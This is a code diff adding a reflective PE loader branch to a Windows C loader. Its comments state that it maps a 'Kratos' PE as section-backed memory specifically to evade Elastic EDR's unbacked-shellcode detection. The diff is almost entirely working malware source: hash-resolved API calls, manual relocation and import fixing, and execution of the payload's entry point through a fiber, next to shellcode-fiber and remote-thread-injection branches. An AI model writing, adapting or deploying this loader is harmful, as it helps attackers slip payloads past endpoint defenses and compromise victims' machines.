@@ -804,6 +804,130 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         pSTF(scFiber);
         DBG("[MS10] Returned from shellcode fiber");
     }
+#elif defined(USE_REFLECTIVE_LOAD)
+    /* Reflective PE loader: maps Kratos PE via NtCreateSection+NtMapViewOfSection.
+       Resulting memory type is MEM_MAPPED (not MEM_PRIVATE/VirtualAlloc), which
+       bypasses "Unbacked Shellcode from Unsigned Module" Elastic detection. */
+    {
+        DBG("[RL] === REFLECTIVE PE LOAD (MEM_MAPPED via NtCreateSection) ===");
+
+        IMAGE_DOS_HEADER *rl_dos = (IMAGE_DOS_HEADER *)sc;
+        if (rl_dos->e_magic != 0x5A4D) { DBG("[FAIL] RL: not a PE"); return 1; }
+        IMAGE_NT_HEADERS *rl_nt = (IMAGE_NT_HEADERS *)(sc + rl_dos->e_lfanew);
+        if (rl_nt->Signature != 0x4550) { DBG("[FAIL] RL: bad NT sig"); return 1; }
+        SIZE_T rl_img_sz = rl_nt->OptionalHeader.SizeOfImage;
+
+        typedef NTSTATUS (NTAPI *t_NtCS2)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
+        typedef NTSTATUS (NTAPI *t_NtMVS2)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);
+        typedef BOOL     (WINAPI *t_CH2)(HANDLE);
+        t_NtCS2  pNtCS2  = (t_NtCS2)  resolve(hNtdll, HF_NtCreateSection);
+        t_NtMVS2 pNtMVS2 = (t_NtMVS2) resolve(hNtdll, HF_NtMapViewOfSection);
+        t_CH2    pCH2    = (t_CH2)    RK32(HF_CloseHandle);
+
+        if (!pNtCS2 || !pNtMVS2) { DBG("[FAIL] RL: Nt* not found"); return 1; }
+
+        HANDLE rl_hSec = NULL;
+        LARGE_INTEGER rl_sz = {0};
+        rl_sz.QuadPart = (LONGLONG)rl_img_sz;
+        NTSTATUS stCS2 = pNtCS2(&rl_hSec, SECTION_ALL_ACCESS, NULL, &rl_sz,
+                                 PAGE_EXECUTE_READWRITE, 0x8000000 /*SEC_COMMIT*/, NULL);
+        DBG_HEX("[RL1] NtCreateSection status", (unsigned long long)(ULONG)stCS2);
+        if (stCS2 != 0 || !rl_hSec) { DBG("[FAIL] RL: NtCreateSection failed"); return 1; }
+
+        PVOID rl_base = NULL;
+        SIZE_T rl_view = 0;
+        NTSTATUS stMVS2 = pNtMVS2(rl_hSec, (HANDLE)-1, &rl_base, 0, 0, NULL,
+                                   &rl_view, 1 /*ViewShare*/, 0, PAGE_EXECUTE_READWRITE);
+        if (pCH2) pCH2(rl_hSec);
+        DBG_HEX("[RL2] NtMapViewOfSection status", (unsigned long long)(ULONG)stMVS2);
+        if (stMVS2 != 0 || !rl_base) { DBG("[FAIL] RL: NtMapViewOfSection failed"); return 1; }
+        DBG_HEX("[RL2] Mapped at", (unsigned long long)(ULONG_PTR)rl_base);
+
+        /* Copy PE headers */
+        memcpy(rl_base, sc, rl_nt->OptionalHeader.SizeOfHeaders);
+
+        /* Copy sections */
+        IMAGE_SECTION_HEADER *rl_sec = IMAGE_FIRST_SECTION(rl_nt);
+        for (WORD rl_i = 0; rl_i < rl_nt->FileHeader.NumberOfSections; rl_i++, rl_sec++) {
+            if (rl_sec->SizeOfRawData > 0 && rl_sec->PointerToRawData > 0) {
+                memcpy((BYTE*)rl_base + rl_sec->VirtualAddress,
+                       sc + rl_sec->PointerToRawData, rl_sec->SizeOfRawData);
+            }
+        }
+
+        /* Free intermediate buffer - PE now lives in MEM_MAPPED region only */
+        { typedef BOOL (WINAPI *t_VF2)(LPVOID,SIZE_T,DWORD); t_VF2 pVF2=(t_VF2)RK32(HF_VirtualFree); if(pVF2) pVF2(sc,0,MEM_RELEASE); }
+        sc = NULL;
+
+        /* Fix base relocations */
+        IMAGE_NT_HEADERS *rl_nt2 = (IMAGE_NT_HEADERS *)((BYTE*)rl_base + ((IMAGE_DOS_HEADER*)rl_base)->e_lfanew);
+        ULONG_PTR rl_delta = (ULONG_PTR)rl_base - (ULONG_PTR)rl_nt2->OptionalHeader.ImageBase;
+        if (rl_delta != 0) {
+            IMAGE_DATA_DIRECTORY *rl_rd = &rl_nt2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+            if (rl_rd->VirtualAddress && rl_rd->Size) {
+                IMAGE_BASE_RELOCATION *rl_rel = (IMAGE_BASE_RELOCATION *)((BYTE*)rl_base + rl_rd->VirtualAddress);
+                while (rl_rel->VirtualAddress && rl_rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
+                    DWORD rl_cnt = (rl_rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                    WORD *rl_ent = (WORD*)((BYTE*)rl_rel + sizeof(IMAGE_BASE_RELOCATION));
+                    for (DWORD rl_k = 0; rl_k < rl_cnt; rl_k++) {
+                        if ((rl_ent[rl_k] >> 12) == IMAGE_REL_BASED_DIR64) {
+                            *(ULONG_PTR*)((BYTE*)rl_base + rl_rel->VirtualAddress + (rl_ent[rl_k] & 0xFFF)) += rl_delta;
+                        } else if ((rl_ent[rl_k] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
+                            *(DWORD*)((BYTE*)rl_base + rl_rel->VirtualAddress + (rl_ent[rl_k] & 0xFFF)) += (DWORD)rl_delta;
+                        }
+                    }
+                    rl_rel = (IMAGE_BASE_RELOCATION*)((BYTE*)rl_rel + rl_rel->SizeOfBlock);
+                }
+            }
+        }
+        DBG("[RL3] Relocations fixed");
+
+        /* Fix IAT */
+        typedef HMODULE (WINAPI *t_LLA2)(LPCSTR);
+        typedef FARPROC (WINAPI *t_GPA2)(HMODULE, LPCSTR);
+        t_LLA2 pLLA2 = (t_LLA2)RK32(HF_LoadLibraryA);
+        t_GPA2 pGPA2 = (t_GPA2)RK32(HF_GetProcAddress);
+        IMAGE_DATA_DIRECTORY *rl_imp_dd = &rl_nt2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+        if (pLLA2 && pGPA2 && rl_imp_dd->VirtualAddress && rl_imp_dd->Size) {
+            IMAGE_IMPORT_DESCRIPTOR *rl_imp = (IMAGE_IMPORT_DESCRIPTOR *)((BYTE*)rl_base + rl_imp_dd->VirtualAddress);
+            while (rl_imp->Name) {
+                HMODULE rl_hMod = pLLA2((LPCSTR)((BYTE*)rl_base + rl_imp->Name));
+                if (rl_hMod) {
+                    ULONG_PTR *rl_thunk = (ULONG_PTR*)((BYTE*)rl_base + rl_imp->FirstThunk);
+                    ULONG_PTR *rl_orig  = (ULONG_PTR*)((BYTE*)rl_base + (rl_imp->OriginalFirstThunk ? rl_imp->OriginalFirstThunk : rl_imp->FirstThunk));
+                    while (*rl_orig) {
+                        if (*rl_orig & IMAGE_ORDINAL_FLAG64) {
+                            *rl_thunk = (ULONG_PTR)pGPA2(rl_hMod, (LPCSTR)(*rl_orig & 0xFFFF));
+                        } else {
+                            IMAGE_IMPORT_BY_NAME *rl_ibn = (IMAGE_IMPORT_BY_NAME *)((BYTE*)rl_base + *rl_orig);
+                            *rl_thunk = (ULONG_PTR)pGPA2(rl_hMod, (LPCSTR)rl_ibn->Name);
+                        }
+                        rl_thunk++; rl_orig++;
+                    }
+                }
+                rl_imp++;
+            }
+        }
+        DBG("[RL4] IAT resolved");
+
+        /* Execute entry point via fiber - PE runs from MEM_MAPPED memory */
+        typedef LPVOID (WINAPI *t_CTTF2)(LPVOID);
+        typedef LPVOID (WINAPI *t_CF2)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
+        typedef void   (WINAPI *t_STF2)(LPVOID);
+        t_CTTF2 pCTTF2 = (t_CTTF2)RK32(HF_ConvertThreadToFiber);
+        t_CF2   pCF2   = (t_CF2)  RK32(HF_CreateFiber);
+        t_STF2  pSTF2  = (t_STF2) RK32(HF_SwitchToFiber);
+
+        ULONG_PTR rl_ep = (ULONG_PTR)rl_base + rl_nt2->OptionalHeader.AddressOfEntryPoint;
+        DBG_HEX("[RL5] Entry point", (unsigned long long)rl_ep);
+
+        if (pCTTF2 && pCF2 && pSTF2) {
+            LPVOID rl_mFiber = pCTTF2(NULL);
+            LPVOID rl_eFiber = pCF2(0x100000, (LPFIBER_START_ROUTINE)rl_ep, NULL);
+            if (rl_eFiber) pSTF2(rl_eFiber);
+        }
+        DBG("[RL6] Reflective load complete");
+    }
 #elif defined(USE_REMOTE_THREAD)
     /* Inject into existing process via NtCreateThreadEx */
     {
